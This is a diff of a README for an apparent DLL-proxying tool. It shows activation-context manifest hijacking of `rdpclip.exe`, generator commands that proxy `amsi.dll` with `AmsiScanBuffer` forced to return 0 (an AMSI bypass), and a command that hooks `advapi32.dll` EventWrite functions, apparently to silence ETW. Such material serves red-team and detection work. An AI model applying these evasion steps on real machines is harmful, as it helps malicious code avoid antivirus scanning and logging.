@@ -97,7 +97,7 @@ Then add the following `<file>` element to the contents of the extracted manifes
         <dpiAware>true/PM</dpiAware>
     </asmv3:windowsSettings>
 </asmv3:application>
-  <file name="crypt32.dll" hash="optional" loadFrom="C:/Path/To/Your/exporttracer.dll"/> -> Add this line
+  <file name="crypt32.dll" hash="optional" loadFrom="C:/Path/To/Your/exporttracer.dll"/> <!-- Add this line -->
 </assembly>
 ```
 
@@ -117,7 +117,7 @@ Finally, run the tool:
 	[+] PEB successfully patched.
 	[-] Resuming process...
 
-Inspecting the newly spawned `rdpclip.exe` process with PH will reveal that `exporttracer.dll` has been loaded. The ExportTracer acts as a proxy, meaning it loads the legitimate `crypt32.dll` to forward to it all the received calls, but it will also register in `C:\Temp\logfile.txt` all the functions of `crypt32.dll` that have been called from `rdpclip.exe`:
+Inspecting the newly spawned `rdpclip.exe` process with Process Hacker will reveal that the application has been redirected into loading `exporttracer.dll` instead of `crypt32.dll`. The ExportTracer DLL acts as a proxy, meaning it loads the legitimate `crypt32.dll` to forward to it all the received calls, but it will also register in `C:\Temp\logfile.txt` all the functions from `crypt32.dll` that have been called during the execution of the process:
 
 ![exporttracer.dll loaded in rdpclip.exe.](/images/exporttracer.PNG "exporttracer.dll loaded in rdpclip.exe.")
 ![Log file.](/images/exporttracer_log.PNG "Log file.")
@@ -139,7 +139,7 @@ Since the hijacking of the main AC of a process allows us to redirect the loadin
 
 	C:\Path\To\ADPT\Generator\target\release> generator.exe -m proxy -p C:\Windows\System32\amsi.dll -e AmsiScanBuffer
 
-In the generated template, modify the function `AmsiScanBuffer` so it just returns 0 (classic amsi bypass):
+In the generated template (ProxyDll project), modify the function `AmsiScanBuffer` so it just returns 0 (classic amsi bypass):
 
 ```rust
 #[no_mangle]
@@ -149,7 +149,7 @@ fn AmsiScanBuffer(arg1:u64, arg2:u64, arg3:u64, arg4:u64, arg5:u64, arg6:u64, ar
 }
 ```
 
-After that compile on `release` mode the project. Then, we do the same to create the DLL that will intercept the calls to `advapi32.dll`: 
+After that compile the ProxyDll project on `release` mode. Then, we do the same to create the DLL that will intercept the calls to `advapi32.dll`: 
 
 	C:\Path\To\ADPT\Generator\target\release> generator.exe -m proxy -p C:\Windows\System32\advapi32.dll -e EventWrite,EventWriteEx,EventWriteString,EventWriteTransfer
 
